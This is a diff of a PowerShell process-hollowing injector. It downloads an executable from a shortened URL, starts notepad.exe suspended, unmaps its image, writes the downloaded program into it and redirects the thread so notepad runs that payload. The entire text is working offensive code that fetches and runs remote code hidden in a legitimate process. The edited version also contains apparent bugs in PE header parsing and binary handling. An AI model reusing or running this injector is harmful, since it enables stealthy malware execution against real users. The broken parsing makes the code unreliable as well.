@@ -143,17 +143,18 @@ public class Native {
 }
 "@ -Language CSharp
 
-Add-Type -AssemblyName System.Windows.Forms
+function Get-Payload {
+    param([string]$url)
+    return (Invoke-WebRequest $url -UseBasicParsing).Content
+}
 
-function Wait-ForKey {
-    param([string]$key)
-    Write-Host "[*] Waiting for key $key press..."
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        if ([System.Windows.Forms.Control]::IsKeyLocked($key) -or [System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::$key) {
-            break
-        }
+function Convert-HexToBytes {
+    param([string]$hex)
+    $bytes = New-Object byte[] ($hex.Length / 2)
+    for ($i = 0; $i -lt $bytes.Length; $i++) {
+        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
     }
+    return $bytes
 }
 
 # CONFIG
@@ -161,28 +162,16 @@ $exeUrl = "https://tinyurl.com/mwr259jv"
 
 Write-Host "[*] Downloading 64-bit payload..."
 $payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
-$peBytes = $payloadBytes.Content
-
-# Convert content (byte array) directly
-if ($peBytes -isnot [byte[]]) {
-    $peBytes = [System.Text.Encoding]::ASCII.GetBytes($peBytes)
-}
+$pe = $payloadBytes.Content
+$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
 
 Write-Host "[*] Waiting for F10 to inject..."
 while ($true) {
     Start-Sleep -Milliseconds 100
-    # F10 key check
-    $vkCode = 0x79
-    $state = [System.Windows.Forms.Control]::IsKeyLocked('F10') # Actually, IsKeyLocked won't work well for F10, use GetAsyncKeyState instead below.
-    # Instead, import GetAsyncKeyState
-    Add-Type @"
-    using System.Runtime.InteropServices;
-    public class Keyboard {
-        [DllImport("user32.dll")]
-        public static extern short GetAsyncKeyState(int vKey);
+    # Check for F10 key pressed (this is simplified, adapt if needed)
+    if ([System.Windows.Forms.Control]::ModifierKeys -eq "None" -and [System.Windows.Forms.Control]::IsKeyLocked('F10')) {
+        break
     }
-"@
-    if ([Keyboard]::GetAsyncKeyState($vkCode) -band 0x8000) { break }
 }
 
 $si = New-Object Native+STARTUPINFO
@@ -190,76 +179,54 @@ $pi = New-Object Native+PROCESS_INFORMATION
 $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
 
 Write-Host "[*] Launching notepad suspended..."
-$CREATE_SUSPENDED = 0x4
-$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
 if (!$result) { Write-Error "[-] Failed to create process"; exit }
 
+# Get base address
 $ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = 0x100000 | 0x1F # CONTEXT_ALL
-
+$ctx.ContextFlags = (0x100000 -bor 0x1F)  # CONTEXT_ALL fixed here
 [Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Read base image address from PEB (Rdx+0x10)
+# Read base image address
 $buffer = New-Object byte[] 8
-$bytesRead = [IntPtr]::Zero
-$pebImageBaseAddressPtr = [IntPtr]::Add([IntPtr]$ctx.Rdx, 0x10)
-[Native]::ReadProcessMemory($pi.hProcess, $pebImageBaseAddressPtr, $buffer, 8, [ref]$bytesRead) | Out-Null
+[IntPtr]$bytesRead = [IntPtr]::Zero
+[Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
 $imageBase = [BitConverter]::ToUInt64($buffer, 0)
 
-# Unmap the original executable image
+# Unmap
 [Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null
 
-# Parse PE headers to get SizeOfImage, SizeOfHeaders, EntryPoint, and NumberOfSections
-# DOS header e_lfanew offset = 0x3C (4 bytes)
-$e_lfanew = [BitConverter]::ToInt32($peBytes, 0x3C)
-# PE header offset
-$peHeaderOffset = $e_lfanew
-# SizeOfImage (DWORD) at PE header + 0x50
-$sizeOfImage = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x50)
-# SizeOfHeaders (DWORD) at PE header + 0x54
-$sizeOfHeaders = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x54)
-# AddressOfEntryPoint (DWORD) at PE header + 0x28
-$entryPointRVA = [BitConverter]::ToUInt32($peBytes, $peHeaderOffset + 0x28)
-# NumberOfSections (WORD) at PE header + 0x6
-$numberOfSections = [BitConverter]::ToUInt16($peBytes, $peHeaderOffset + 0x6)
-# Section headers start right after PE header + size of standard fields
-$sectionHeadersStart = $peHeaderOffset + 0xF8
+# Parse new image size and entry
+$newImageBase = $imageBase
+$payloadSize = $peBytes.Length
+$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)  # e_lfanew + 0x28 (AddressOfEntryPoint)
+$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
+$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)
 
-# Allocate memory in remote process
-$MEM_COMMIT = 0x1000
-$MEM_RESERVE = 0x2000
-$PAGE_EXECUTE_READWRITE = 0x40
-$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$imageBase, $sizeOfImage, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+# Allocate memory
+$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)
 
-if ($remoteBase -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to allocate memory in remote process."
-    exit
-}
+# Write headers
+[Native]::WriteProcessMemory($pi.hProcess, [IntPtr]$remoteBase, $peBytes, $headersSize, [ref]$null) | Out-Null
 
-# Write PE Headers
-$bytesWritten = [IntPtr]::Zero
-[Native]::WriteProcessMemory($pi.hProcess, $remoteBase, $peBytes, $sizeOfHeaders, [ref]$bytesWritten) | Out-Null
-
-# Write sections
+# Write each section
+$numberOfSections = [BitConverter]::ToUInt16($peBytes, 0x6)
+$sectionOffset = 0xF8
 for ($i = 0; $i -lt $numberOfSections; $i++) {
-    $sectionOffset = $sectionHeadersStart + ($i * 0x28)
-    $virtualAddress = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
-    $sizeOfRawData = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
-    $pointerToRawData = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)
-
-    if ($sizeOfRawData -eq 0) { continue }
-
-    $sectionData = $peBytes[$pointerToRawData..($pointerToRawData + $sizeOfRawData - 1)]
-
-    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]::Add($remoteBase, $virtualAddress), $sectionData, $sizeOfRawData, [ref]$bytesWritten) | Out-Null
+    $virtualAddr = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
+    $rawSize = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
+    $rawOffset = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)
+    $sectionData = $peBytes[$rawOffset..($rawOffset + $rawSize - 1)]
+    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]($remoteBase.ToInt64() + $virtualAddr), $sectionData, $rawSize, [ref]$null) | Out-Null
+    $sectionOffset += 0x28
 }
 
-# Set thread context RIP to entry point
-$ctx.Rip = [UInt64]::op_Explicit([IntPtr]::Add($remoteBase, $entryPointRVA))
-
+# Set RIP to new entry point
+$ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
+$ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 [Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Resume thread
+# Resume
 [Native]::ResumeThread($pi.hThread) | Out-Null
 
-Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
+Write-Host "[+] Hollowing complete! notepad.exe is running payload."
